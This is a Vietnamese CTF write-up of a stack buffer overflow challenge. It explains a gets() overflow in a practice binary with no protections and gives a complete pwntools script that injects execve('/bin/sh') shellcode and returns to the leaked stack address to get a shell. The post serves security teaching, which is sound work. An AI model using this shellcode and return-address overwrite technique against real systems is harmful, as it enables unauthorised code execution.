---
title: "Pwn5-MiniCTF-PTITHCM"
date: 2024-01-07 00:00:00 +0700
categories: [CTF, Binary Exploitation]
tags: [pwn, shellcode, gets, stack-overflow, ptithcm]
author: datious
---
# Pwn5 - MiniCTF - PTITHCM
*Author: D1n0_09-N24DCAT015*

Bài pwn5 này có phuong pháp khai thác tương tự pwn4

1. Tìm lỗ hổng
- Giải nén ta được các thư mục chứa các file như sau 
 ![image](https://hackmd.io/_uploads/Sy4hhallWe.png)
- Dùng pwninit để patched các file tạo môi trường cho file binary.
- Chạy thử file binary patched.
```
(pwnenv)─(kali㉿kali)-[~/Downloads/pwn5]
└─$ ./chall_patched 
0x7ffcd3ef37d0: 0000000000000000 <- rsp
0x7ffcd3ef37d8: 00007fac2ae354e0 
0x7ffcd3ef37e0: 00007ffcd3ef3820 
0x7ffcd3ef37e8: 00007fac2ac9d451 
0x7ffcd3ef37f0: 00007ffcd3ef3890 <- rbp
0x7ffcd3ef37f8: 00007fac2ac2a575 
Input: 

```
- Đã có địa chỉ để nhảy vào khi tạo shellcode trên stack
- Mở ghidra để tìm lỗ hổng
```
int main(void)

{
  char buf [32];
  
  dump_stack();
  printf("Input: ");
  gets(buf);
  printf("Output: ");
  printf(buf);
  putchar(10);
  dump_stack();
  return 0;
}
```
- Lỗi buffer overflow tại hàm gets cho nhập không giới hạn.
* Checksec => Đây la bước quan trọng để đưa ra hướng khai thác
```
gef➤  checksec
[+] checksec for '/home/kali/Downloads/pwn5/chall_patched'
Canary                        : ✘ 
NX                            : ✘ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : ✘ 

```
- Tất cả các lớp bảo mật đều tắt nên em sẽ khai thác theo hướng return vào shellcode để lấy quyền điều khiển.
2. Khai thác
- Tìm offset: do biến buf có kích thước 32 bytes nên ta sẽ thử với input 48 bytes.
![image](https://hackmd.io/_uploads/SkDokRgxWg.png)
- Đã overwrite save rip.
- Vậy offset là 40 bytes.
//shellcode : dùng để thực thi điều khiển chương trình.
- Tiến hành nhận địa chỉ mà chương trình cung cấp, chính là địa chỉ của biến buf => Nhảy vào đây để getshell.
3. Viết script khai thác
```
#!/usr/bin/python3
from pwn import *
exe=ELF('./chall_patched',checksec=False)
p=process(exe.path)
leak=int(p.recv(14),16)
log.info("leak: "+hex(leak))
offset=40  
shellcode=asm('''
mov rdi,29400045130965551
push rdi   
mov rdi,rsp
xor rsi,rsi
xor rdx,rdx 
mov rax,0x3b
syscall    
''',arch='amd64')
payload=shellcode  
payload=payload.ljust(40)
payload+=p64(leak) 
p.sendline(payload)
p.interactive()

```
![image](https://hackmd.io/_uploads/rkEWZ0ee-e.png)
- Thay đổi p=remote(HOST,PORT) để lấy flag!
